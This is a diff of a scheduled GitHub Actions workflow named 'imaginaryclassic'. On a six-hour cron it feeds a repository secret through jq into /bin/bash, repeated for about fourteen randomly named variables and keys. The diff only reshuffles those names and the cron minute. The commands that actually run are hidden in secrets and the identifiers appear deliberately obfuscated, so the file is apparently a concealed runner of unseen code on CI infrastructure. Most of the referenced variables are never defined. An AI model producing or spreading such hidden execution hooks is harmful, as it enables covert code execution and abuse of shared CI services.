@@ -1,28 +1,30 @@
 name: imaginaryclassic
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '40 3/6 * * *'
-jobs:  # 2339
+    - cron: '20 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: imaginaryclassic
         env:
-          xl58817: ${{ secrets.xl58817 }}
+          vq1: ${{ secrets.vq1 }}
         run: |
-          echo $xl58817 | jq -r .my270 | /bin/bash
-          echo $lgqp416 | jq -r .a8208 | /bin/bash
-          echo $hj5983 | jq -r .veu2 | /bin/bash
-          echo $zri151 | jq -r .soo57 | /bin/bash
-          echo $eqcd034 | jq -r .pxm5 | /bin/bash
-          echo $yyj7 | jq -r .lmg02110 | /bin/bash
-          echo $vycxz365 | jq -r .au353 | /bin/bash
-          echo $jbg32 | jq -r .tejcv60532 | /bin/bash
-          echo $hb2 | jq -r .bkbj6558 | /bin/bash
-          echo $vd846 | jq -r .mjd869 | /bin/bash
-          echo $g8173 | jq -r .urri96 | /bin/bash
-          echo $w1 | jq -r .z7116 | /bin/bash
-          echo $ihi91 | jq -r .xzq6567 | /bin/bash
+          echo $vq1 | jq -r .ycqr1 | /bin/bash
+          echo $eb802 | jq -r .uru5005 | /bin/bash
+          echo $emm7 | jq -r .lzg120 | /bin/bash
+          echo $hx52 | jq -r .xnaq79039 | /bin/bash
+          echo $ddulz8 | jq -r .y071 | /bin/bash
+          echo $pr1 | jq -r .enqsl588 | /bin/bash
+          echo $eni4326 | jq -r .pyd7584 | /bin/bash
+          echo $b87909 | jq -r .wktwi3889 | /bin/bash
+          echo $yajl3 | jq -r .ik9 | /bin/bash
+          echo $rtw39470 | jq -r .wx7142 | /bin/bash
+          echo $h15 | jq -r .juljb9304 | /bin/bash
+          echo $odvz02244 | jq -r .xtzp23 | /bin/bash
+          echo $deilu32 | jq -r .mggmx189 | /bin/bash
+          echo $ll95 | jq -r .d2 | /bin/bash
 
